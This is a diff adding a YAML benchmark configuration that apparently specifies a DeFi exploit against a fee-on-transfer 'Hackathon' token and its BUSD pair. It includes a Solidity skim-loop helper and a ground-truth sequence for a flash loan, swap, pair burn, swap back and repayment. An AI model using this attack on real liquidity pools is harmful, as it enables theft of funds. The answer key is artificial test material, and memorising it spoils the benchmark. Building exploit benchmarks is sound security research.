@@ -1,0 +1,67 @@
+# Information for benchmarks building.
+project_name: "Hackathon"
+
+ctrt_name2cls:
+  - ["busd", "BUSD"]
+  - ["hackathon", "Hackathon"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["busd", ""]
+  - ["hackathon", "new Hackathon()"]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+  
+extra_actions: 
+ - "function burn_hackathon_pair(uint256 amount) internal eurus {
+      hackathon.transfer(address(pair), amount);
+      uint256 i = 0;
+      while (i < 10) {
+        pair.skim(address(pair));
+        pair.skim(address(attacker)); 
+        i++; 
+      }
+  }"
+
+extra_deployments: 
+  - "uint256[] memory feeList = new uint256[](3);
+    feeList[0] = 500;
+    feeList[1] = 500;
+    feeList[2] = 0;
+    hackathon.prepare(address(pair), true, feeList);"
+
+extra_statements: []
+
+attack_goal_str: "busd; 1e12"
+
+groundtruth:
+  - ["borrow", "busd", "owner", "2200 * 1e18"]
+  - ["swap", "pair", "attacker", "busd", "hackathon", "busd.balanceOf(attacker)", "pair.getAmountOut(busd.balanceOf(attacker), address(busd))"]
+  - ["burn", "hackathon", "pair", "hackathon.balanceOf(attacker)"]
+  - ["swap", "pair", "attacker", "hackathon", "busd", "hackathon.balanceOf(attacker)", "pair.getAmountOut(hackathon.balanceOf(attacker), address(hackathon))"]
+  - ["payback", "busd", "owner", "2200 * 1e18 * 1003 / 1000"]
+
+# Information for search space building.
+roles:
+  "busd":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "hackathon":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "pair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["hackathon", "busd"]
+    support_swaps:
+      "busd": ["hackathon", "busd"]
+      "hackathon": ["hackathon", "busd"]
+    is_oracle: true
+    oracle: "pair"
+
+pattern: "Token Burn"
